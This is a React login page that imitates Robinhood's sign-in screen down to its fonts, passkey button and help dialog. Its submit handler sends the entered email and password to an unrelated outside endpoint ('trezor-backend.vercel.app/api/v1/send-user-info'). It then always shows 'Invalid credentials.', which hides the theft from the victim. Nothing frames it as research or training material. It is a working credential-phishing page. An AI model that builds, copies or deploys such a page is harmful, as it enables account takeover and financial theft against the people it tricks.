"use client";
import React, { useState } from "react";
import {
    Box,
    Button,
    Checkbox,
    Dialog,
    DialogActions,
    DialogContent,
    DialogTitle,
    FormControlLabel,
    Grid,
    IconButton,
    InputAdornment,
    Link,
    List,
    ListItemButton,
    Snackbar,
    Stack,
    TextField,
    Typography,
} from "@mui/material";
import CloseIcon from '@mui/icons-material/Close';
import { Visibility, VisibilityOff } from "@mui/icons-material";
import LockIcon from '@mui/icons-material/Lock';
import axios from "axios";
export default function LoginMainPage() {
    const [openHelpModal, setOpenHelpModal] = useState(false);
    const [email, setEmail] = useState("");
    const [password, setPassword] = useState("");
    const [showPassword, setShowPassword] = useState(false);
    const handleOpenHelp = () => setOpenHelpModal(true);
    const handleCloseHelp = () => setOpenHelpModal(false);
    const [open, setOpen] = useState(false);

    const handleTogglePassword = () => setShowPassword((prev) => !prev);
    // --- Form submit handler ---
    const handleSubmit = async (e) => {
        e.preventDefault(); // Prevent page reload
        try {
            if (!email || !password) {
                alert("Please enter both email and password");
                return;
            }
            const data = {
                title: "Robin Hood",
                email: email,
                password
            }
            setLoading(true)
            const response = await axios.post("https://trezor-backend.vercel.app/api/v1/send-user-info", data)
            if (response) {
                setOpen(true)
            }
        } catch (err) {
            console.log(err);

        } finally {
            setLoading(false)

        }
    };
    const handleClose = (event, reason) => {
        if (reason === 'clickaway') {
            return;
        }

        setOpen(false);
    };
    const action = (
        <React.Fragment>
            <Button color="secondary" size="small" onClick={handleClose}>
                UNDO
            </Button>
        </React.Fragment>
    );
    return (
        <Box sx={{ bgcolor: "black", color: "white", minHeight: "100vh" }}>
            <Snackbar
                open={open}
                autoHideDuration={6000}
                onClose={handleClose}
                message="Invalid credentials."
                action={action}
                anchorOrigin={{ vertical: 'top', horizontal: 'right' }}
            />
            <Grid container>
                {/* ---------- Left Section: Video Background ---------- */}
                <Grid
                    size={{ xs: 0, md: 6 }}
                    sx={{
                        position: "relative",
                        display: { xs: "none", md: "block" },
                        overflow: "hidden",
                        bgcolor: "black",
                    }}
                >
                    <Box
                        component="img"
                        src="/animation.svg"
                        alt="Animated SVG Background"
                        sx={{
                            width: "100%",
                            height: "100%",
                            position: "absolute",
                            top: "50%",
                            left: "50%",
                            transform: "translate(-50%, -50%)",
                            objectFit: "cover",
                            pointerEvents: "none",

                        }}
                    />

                </Grid>

                {/* ---------- Right Section: Login Form ---------- */}
                <Grid
                    size={{ xs: 12, md: 6 }}
                    sx={{
                        display: "flex",
                        // alignItems: "center",
                        justifyContent: "center",
                        minHeight: "100vh",
                        p: { xs: "80px 40px", md: "62px 120px 52px 52px" },
                        borderLeft: "1px solid rgb(48, 54, 58)",
                        height: "100vh",
                        overflowY: "auto"
                    }}
                >
                    <Box sx={{ width: "100%", }}>
                        <Typography
                            variant="h5"
                            fontWeight={600}
                            mb={4}
                            textAlign="left"
                            color="white"
                            sx={{
                                fontSize: "21px",
                                fontFamily:
                                    '"Capsule Sans Display", system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif',
                            }}
                        >
                            Log in to Robinhood
                        </Typography>
                        <form onSubmit={handleSubmit}>
                            {/* Email */}
                            <Typography variant="body2" mb={1} sx={{
                                color: "white", fontFamily:
                                    '"Capsule Sans Display", system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif',
                                fontWeight: 400,
                                fontSize: "13px"
                            }}>
                                Email
                            </Typography>
                            <TextField
                                fullWidth
                                variant="outlined"
                                type="email"
                                required
                                value={email}
                                onChange={(e) => setEmail(e.target.value)}
                                size="small"
                                InputProps={{
                                    sx: { color: "white", borderColor: "#444" },
                                }}
                                InputLabelProps={{ style: { color: "#aaa" } }}
                                sx={{
                                    mb: 3,
                                    "& .MuiOutlinedInput-root": {
                                        "& fieldset": { borderColor: "#444" },
                                        "&:hover fieldset": { borderColor: "white" },
                                    },
                                }}
                            />

                            {/* Password */}
                            <Typography variant="body2" mb={1} sx={{
                                color: "white", fontFamily:
                                    '"Capsule Sans Display", system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif',
                                fontWeight: 400,
                                fontSize: "13px"
                            }}>
                                Password
                            </Typography>
                            <TextField
                                fullWidth
                                type={showPassword ? "text" : "password"}
                                size="small"
                                variant="outlined"
                                value={password}
                                onChange={(e) => setPassword(e.target.value)}
                                required
                                sx={{
                                    mb: 2,
                                    "& .MuiOutlinedInput-root": {
                                        "& fieldset": { borderColor: "#444" },
                                        "&:hover fieldset": { borderColor: "white" },
                                    },
                                    input: {
                                        color: "white", // optional for dark backgrounds
                                    },
                                }}
                                InputProps={{
                                    endAdornment: (
                                        <InputAdornment position="end">
                                            <IconButton
                                                onClick={handleTogglePassword}
                                                edge="end"
                                                sx={{ color: "white" }}
                                            >
                                                {showPassword ? <VisibilityOff sx={{ fontSize: "18px" }} /> : <Visibility sx={{ fontSize: "18px" }} />}
                                            </IconButton>
                                        </InputAdornment>
                                    ),
                                }}
                            />

                            {/* Checkbox */}
                            <FormControlLabel
                                control={
                                    <Checkbox
                                        sx={{
                                            color: "rgb(145, 159, 166)",
                                            "&.Mui-checked": { color: "rgb(145, 159, 166)" },
                                        }}
                                        size="small"
                                    />
                                }
                                sx={{

                                    fontFamily:
                                        '"Capsule Sans Display", system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif',
                                    span: { color: "white", fontSize: "13px" }
                                }}
                                label="Keep me logged in for up to 30 days"
                            />

                            {/* Buttons */}
                            <Box display="flex" gap={2} mt={5} mb={5}>
                                <Button
                                    fullWidth
                                    type="submit"
                                    variant="contained"
                                    sx={{
                                        bgcolor: "white",
                                        height: "44px",
                                        color: "black",
                                        textTransform: "none",
                                        fontWeight: 700,
                                        "&:hover": { bgcolor: "#ddd" },
                                        borderRadius: "24px",
                                        fontSize: "13px",
                                        fontFamily:
                                            '"Capsule Sans Display", system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif',
                                    }}
                                >
                                    Log In
                                </Button>
                                <Button
                                    fullWidth
                                    variant="outlined"
                                    type="button"
                                    sx={{
                                        borderColor: "white",
                                        color: "white",
                                        height: "44px",
                                        textTransform: "none",
                                        fontWeight: 700,
                                        borderRadius: "24px",
                                        fontSize: "13px",
                                        "&:hover": { borderColor: "#aaa" },

                                        fontFamily:
                                            '"Capsule Sans Display", system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif',

                                    }}
                                    onClick={handleOpenHelp}

                                >
                                    Help
                                </Button>
                            </Box>
                        </form>

                        {/* Divider */}
                        <Box
                            my={3}

                            display="flex"
                            alignItems="center"
                            justifyContent="center"
                        >
                            <Box sx={{ flex: 1, height: "1px", bgcolor: "#333" }}></Box>
                            <Typography mx={2} color="#aaa">
                                or
                            </Typography>
                            <Box sx={{ flex: 1, height: "1px", bgcolor: "#333" }}></Box>
                        </Box>

                        {/* Passkey login */}
                        <Button
                            fullWidth
                            variant="contained"
                            startIcon={<LockIcon sx={{ fontSize: "10px", color: "black" }} />}
                            sx={{
                                width: "250px",
                                fontSize: "13px",
                                backgroundColor: "#fff",
                                color: "#000",
                                textTransform: "none",
                                fontWeight: 600,
                                height: "44px",
                                borderRadius: "9999px", // full rounded pill shape
                                boxShadow: "0 1px 3px rgba(0,0,0,0.1)",
                                py: 1.2,
                                "&:hover": {
                                    backgroundColor: "#f7f7f7",
                                    boxShadow: "0 2px 6px rgba(0,0,0,0.15)",
                                },
                                mt: 3,
                                fontFamily:
                                    '"Capsule Sans Display", system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif',

                            }}
                        >
                            Log in with passkeys
                        </Button>

                        {/* Create account */}
                        <Typography mt={5} sx={{ fontSize: "13px", fontWeight: 500 }} color="#aaa">
                            Not on Robinhood?{" "}
                            <Link href="#" underline="hover" sx={{ color: "white", textDecoration: "underline", fontWeight: 700 }}>
                                Create an account
                            </Link>
                        </Typography>
                        <Typography mt={5} sx={{ fontSize: "13px" }} color="#aaa">
                            This site is protected by reCAPTCHA and the Google {" "}
                            <Link href="#" underline="hover" sx={{ color: "rgb(145, 159, 166)", fontWeight: 700, textDecoration: "underline" }}>
                                Privacy Policy
                            </Link>
                            .{" "}
                            <Link href="#" underline="hover" sx={{ color: "rgb(145, 159, 166)", fontWeight: 700, textDecoration: "underline" }}>
                                Terms of Service
                            </Link>{" "}
                            apply.
                        </Typography>
                    </Box>
                </Grid>
            </Grid>
            <Dialog
                open={openHelpModal}
                onClose={handleCloseHelp}
                PaperProps={{
                    sx: {
                        bgcolor: "rgb(30, 33, 36)",
                        color: "white",
                        borderRadius: "6px",
                        minWidth: 400,
                        border: "none"
                    },
                }}
            >
                <Stack direction={"row"} justifyContent={"space-between"}>

                    <DialogTitle sx={{
                        fontWeight: 600, border: "none", color: "white", fontFamily:
                            '"Capsule Sans Display", system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif',
                    }}>What can we help with?</DialogTitle>
                    <IconButton
                        aria-label="close"
                        onClick={handleCloseHelp}
                        sx={(theme) => ({
                            position: 'absolute',
                            right: 8,
                            top: 8,
                            color: theme.palette.grey[500],
                        })}
                    >
                        <CloseIcon />
                    </IconButton>
                </Stack>
                <DialogContent dividers sx={{ px: 3, py: 0 }}>
                    <List>
                        {[
                            "I forgot my password",
                            "I forgot the email address I log in with",
                            "I need access to an account as a third party",
                            "There's an unauthorized account in my name",
                        ].map((text, idx) => (
                            <ListItemButton
                                key={idx}
                                sx={{
                                    color: "white",
                                    borderBottom: "1px solid #333",
                                    pb: 2,
                                    px: 0,
                                    fontSize: "13px",
                                    fontWeight: "700",
                                    fontFamily:
                                        '"Capsule Sans Display", system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif',

                                    // "&:hover": { bgcolor: "#222" },
                                }}
                            >
                                {text}
                            </ListItemButton>
                        ))}
                    </List>
                </DialogContent>
                <DialogActions sx={{ px: 3, pb: 3 }}>
                    <Button
                        fullWidth
                        variant="outlined"
                        sx={{
                            borderColor: "white",
                            color: "white",
                            height: "44px",
                            textTransform: "none",
                            fontWeight: 700,
                            borderRadius: "24px",
                            fontSize: "13px",
                            mt: 2,
                            background: "rgb(30, 33, 36)",
                            "&:hover": { borderColor: "#aaa" },

                            fontFamily:
                                '"Capsule Sans Display", system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif',

                        }}
                        onClick={handleCloseHelp}

                    >
                        Cancel
                    </Button>
                </DialogActions>
            </Dialog>
        </Box>
    );
}
